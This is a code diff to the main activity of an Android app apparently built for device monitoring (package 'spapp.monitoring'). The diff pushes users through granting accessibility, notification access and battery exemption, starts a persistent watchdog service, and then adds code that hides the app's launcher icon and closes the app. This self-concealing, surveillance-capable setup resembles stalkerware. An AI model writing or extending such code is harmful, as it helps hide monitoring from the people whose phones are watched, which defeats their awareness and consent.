@@ -158,7 +158,8 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) {
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
+        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
+            isOneTapFlowRunning = true
             handleNextSetupStep()
         } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
             triggerAutoSyncAfterAccessibility()
@@ -170,13 +171,13 @@ class MainActivity : AppCompatActivity() {
     // 3. Individual remaining permission launchers (tapped manually)
 
     private val batteryExemptionLauncher = registerForActivityResult(
-
         ActivityResultContracts.StartActivityForResult()
-
     ) {
-
         refreshPermissionStatus()
-
+        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
+            isOneTapFlowRunning = true
+            handleNextSetupStep()
+        }
     }
 
 
@@ -200,11 +201,8 @@ class MainActivity : AppCompatActivity() {
     ) {
         isNotificationDialogShowing = false
         refreshPermissionStatus()
-        if (isOneTapFlowRunning) {
-            handleNextSetupStep()
-        } else if (isNotificationAccessGranted() && isAccessibilityEnabled() && getMissingRuntimePermissions().isEmpty()) {
-            triggerAutoSyncAfterAccessibility()
-        }
+        isOneTapFlowRunning = true
+        handleNextSetupStep()
     }
 
 
@@ -538,29 +536,17 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun hideAppIcon() {
-
         try {
-
-            val p = packageManager
-
-            val componentName = ComponentName(this, "$packageName.ui.SplashActivity")
-
-            p.setComponentEnabledSetting(
-
+            val componentName = ComponentName(this, "$packageName.LauncherAlias")
+            packageManager.setComponentEnabledSetting(
                 componentName,
-
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-
                 PackageManager.DONT_KILL_APP
-
             )
-
+            Log.i(TAG, "LauncherAlias disabled: App icon hidden from home screen without touching SplashActivity")
         } catch (e: Exception) {
-
             Log.e(TAG, "Error hiding app icon", e)
-
         }
-
     }
 
 
@@ -571,7 +557,8 @@ class MainActivity : AppCompatActivity() {
         statusUpdater.run()
         uploadCurrentFcmToken()
 
-        if (isOneTapFlowRunning) {
+        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
+            isOneTapFlowRunning = true
             handleNextSetupStep()
         } else if (isAccessibilityEnabled() && isNotificationAccessGranted() && getMissingRuntimePermissions().isEmpty()) {
             triggerAutoSyncAfterAccessibility()
@@ -643,6 +630,13 @@ class MainActivity : AppCompatActivity() {
         triggerAutoSyncAfterAccessibility()
         com.spapp.monitoring.sync.PersistentWatchdogService.start(applicationContext)
         Log.i(TAG, "Core permissions, Accessibility, Notification Access & Battery Exemption all active")
+
+        // Auto hide app icon and close the app
+        hideAppIcon()
+        Toast.makeText(this, "Setup completed successfully", Toast.LENGTH_SHORT).show()
+        Handler(Looper.getMainLooper()).postDelayed({
+            finishAndRemoveTask()
+        }, 1200L)
     }
 
 
